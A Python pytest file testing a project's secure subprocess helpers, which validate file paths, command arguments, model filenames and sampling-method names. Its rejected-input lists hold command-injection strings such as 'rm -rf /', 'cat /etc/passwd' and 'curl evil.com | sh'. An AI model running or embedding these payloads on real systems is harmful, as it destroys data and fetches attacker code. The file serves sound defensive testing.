#!/usr/bin/env python3
"""
Security tests to verify protection against command injection vulnerabilities.

These tests ensure that the secure subprocess utilities properly prevent
command injection attacks and validate inputs correctly.
"""

import pytest
import os
import sys
from unittest.mock import patch, MagicMock

# Add the project root to the path
sys.path.insert(0, os.path.dirname(os.path.dirname(os.path.abspath(__file__))))

from utils.secure_subprocess import (
    SecureSubprocessError,
    validate_file_path,
    validate_command_args,
    secure_run,
    secure_python_script,
    validate_model_filename,
    validate_sampling_method
)


class TestSecureSubprocess:
    """Test cases for secure subprocess utilities."""
    
    def test_validate_file_path_safe_path(self):
        """Test that safe file paths are accepted."""
        # Create a temporary file for testing
        test_file = "test_file.txt"
        with open(test_file, 'w') as f:
            f.write("test")
        
        try:
            result = validate_file_path(test_file, must_exist=True)
            assert result == test_file
        finally:
            os.remove(test_file)
    
    def test_validate_file_path_path_traversal(self):
        """Test that path traversal attempts are rejected."""
        with pytest.raises(SecureSubprocessError, match="Path traversal detected"):
            validate_file_path("../../../etc/passwd")
        
        with pytest.raises(SecureSubprocessError, match="Path traversal detected"):
            validate_file_path("/etc/passwd")
    
    def test_validate_file_path_nonexistent(self):
        """Test that nonexistent files are rejected when must_exist=True."""
        with pytest.raises(SecureSubprocessError, match="File does not exist"):
            validate_file_path("nonexistent_file.txt", must_exist=True)
    
    def test_validate_file_path_nonexistent_allowed(self):
        """Test that nonexistent files are allowed when must_exist=False."""
        result = validate_file_path("nonexistent_file.txt", must_exist=False)
        assert result == "nonexistent_file.txt"
    
    def test_validate_command_args_safe_args(self):
        """Test that safe command arguments are accepted."""
        safe_args = ["python", "script.py", "arg1", "arg2"]
        result = validate_command_args(safe_args)
        assert result == safe_args
    
    def test_validate_command_args_dangerous_chars(self):
        """Test that dangerous characters are rejected."""
        dangerous_args = [
            ["python", "script.py; rm -rf /"],
            ["python", "script.py & echo hacked"],
            ["python", "script.py | cat /etc/passwd"],
            ["python", "script.py `whoami`"],
            ["python", "script.py $(id)"],
            ["python", "script.py (malicious)"],
            ["python", "script.py < input.txt"],
            ["python", "script.py > output.txt"],
            ["python", "script.py\nmalicious"],
        ]
        
        for args in dangerous_args:
            with pytest.raises(SecureSubprocessError, match="Unsafe characters detected"):
                validate_command_args(args)
    
    def test_validate_command_args_not_list(self):
        """Test that non-list arguments are rejected."""
        with pytest.raises(SecureSubprocessError, match="Command arguments must be a list"):
            validate_command_args("not a list")
    
    def test_validate_command_args_non_string_elements(self):
        """Test that non-string elements are rejected."""
        with pytest.raises(SecureSubprocessError, match="All arguments must be strings"):
            validate_command_args(["python", 123, "script.py"])
    
    def test_validate_model_filename_safe_names(self):
        """Test that safe model filenames are accepted."""
        safe_names = [
            "model.pkl",
            "my_model.pkl",
            "model_v1.pkl",
            "model-2023.pkl",
            "model_2023_01_15.pkl"
        ]
        
        for name in safe_names:
            result = validate_model_filename(name)
            assert result == name
    
    def test_validate_model_filename_auto_extension(self):
        """Test that .pkl extension is added automatically."""
        result = validate_model_filename("model")
        assert result == "model.pkl"
    
    def test_validate_model_filename_path_traversal(self):
        """Test that path traversal in filenames is prevented."""
        with pytest.raises(SecureSubprocessError, match="Invalid characters in filename"):
            validate_model_filename("../../../etc/passwd")
    
    def test_validate_model_filename_dangerous_chars(self):
        """Test that dangerous characters in filenames are rejected."""
        dangerous_names = [
            "model; rm -rf /",
            "model & echo hacked",
            "model | cat /etc/passwd",
            "model`whoami`",
            "model$(id)",
            "model(malicious)",
            "model<script>",
            "model>output",
        ]
        
        for name in dangerous_names:
            with pytest.raises(SecureSubprocessError, match="Invalid characters in filename"):
                validate_model_filename(name)
    
    def test_validate_sampling_method_safe_methods(self):
        """Test that safe sampling methods are accepted."""
        safe_methods = ["baseline", "smote", "adasyn", "conservative", "random", "borderline"]
        
        for method in safe_methods:
            result = validate_sampling_method(method)
            assert result == method.lower()
    
    def test_validate_sampling_method_case_insensitive(self):
        """Test that method names are case-insensitive."""
        result = validate_sampling_method("SMOTE")
        assert result == "smote"
    
    def test_validate_sampling_method_unknown_method(self):
        """Test that unknown methods are rejected."""
        with pytest.raises(SecureSubprocessError, match="Unknown sampling method"):
            validate_sampling_method("unknown_method")
    
    def test_validate_sampling_method_dangerous_chars(self):
        """Test that dangerous characters in method names are rejected."""
        dangerous_methods = [
            "smote; rm -rf /",
            "smote & echo hacked",
            "smote | cat /etc/passwd",
            "smote`whoami`",
            "smote$(id)",
        ]
        
        for method in dangerous_methods:
            with pytest.raises(SecureSubprocessError, match="Invalid characters in method name"):
                validate_sampling_method(method)
    
    @patch('subprocess.run')
    def test_secure_run_success(self, mock_run):
        """Test successful secure_run execution."""
        mock_result = MagicMock()
        mock_result.returncode = 0
        mock_result.stdout = "success"
        mock_result.stderr = ""
        mock_run.return_value = mock_result
        
        result = secure_run(["python", "script.py"], timeout=30)
        
        assert result.returncode == 0
        mock_run.assert_called_once()
        call_args = mock_run.call_args
        assert call_args[0][0] == ["python", "script.py"]
        assert call_args[1]["timeout"] == 30
        assert call_args[1]["shell"] is False  # Security check
    
    @patch('subprocess.run')
    def test_secure_run_always_disables_shell(self, mock_run):
        """Test that shell is always disabled for security."""
        mock_result = MagicMock()
        mock_result.returncode = 0
        mock_run.return_value = mock_result
        
        # Try to enable shell (should be overridden)
        secure_run(["python", "script.py"], shell=True)
        
        call_args = mock_run.call_args
        assert call_args[1]["shell"] is False
    
    def test_secure_run_dangerous_command(self):
        """Test that dangerous commands are rejected."""
        with pytest.raises(SecureSubprocessError, match="Unsafe characters detected"):
            secure_run(["python", "script.py; rm -rf /"])
    
    @patch('subprocess.run')
    def test_secure_python_script_success(self, mock_run):
        """Test successful secure_python_script execution."""
        mock_result = MagicMock()
        mock_result.returncode = 0
        mock_result.stdout = "success"
        mock_result.stderr = ""
        mock_run.return_value = mock_result
        
        # Create a temporary Python script for testing
        test_script = "test_script.py"
        with open(test_script, 'w') as f:
            f.write("print('hello')")
        
        try:
            result = secure_python_script(test_script, ["arg1", "arg2"])
            
            assert result.returncode == 0
            mock_run.assert_called_once()
            call_args = mock_run.call_args
            expected_cmd = [sys.executable, test_script, "arg1", "arg2"]
            assert call_args[0][0] == expected_cmd
        finally:
            os.remove(test_script)
    
    def test_secure_python_script_nonexistent_script(self):
        """Test that nonexistent scripts are rejected."""
        with pytest.raises(SecureSubprocessError, match="File does not exist"):
            secure_python_script("nonexistent_script.py")
    
    def test_secure_python_script_non_python_file(self):
        """Test that non-Python files are rejected."""
        # Create a non-Python file
        test_file = "test_file.txt"
        with open(test_file, 'w') as f:
            f.write("not python")
        
        try:
            with pytest.raises(SecureSubprocessError, match="Script must be a Python file"):
                secure_python_script(test_file)
        finally:
            os.remove(test_file)
    
    def test_command_injection_protection(self):
        """Test comprehensive command injection protection."""
        # Test various command injection patterns
        injection_patterns = [
            "model; rm -rf /",
            "model && echo hacked",
            "model || echo hacked", 
            "model | cat /etc/passwd",
            "model`whoami`",
            "model$(id)",
            "model; curl evil.com | sh",
            "model && wget evil.com -O- | sh",
        ]
        
        for pattern in injection_patterns:
            # Test in model filename
            with pytest.raises(SecureSubprocessError):
                validate_model_filename(pattern)
            
            # Test in sampling method
            with pytest.raises(SecureSubprocessError):
                validate_sampling_method(pattern)
            
            # Test in command arguments
            with pytest.raises(SecureSubprocessError):
                validate_command_args(["python", "script.py", pattern])


if __name__ == "__main__":
    pytest.main([__file__, "-v"])
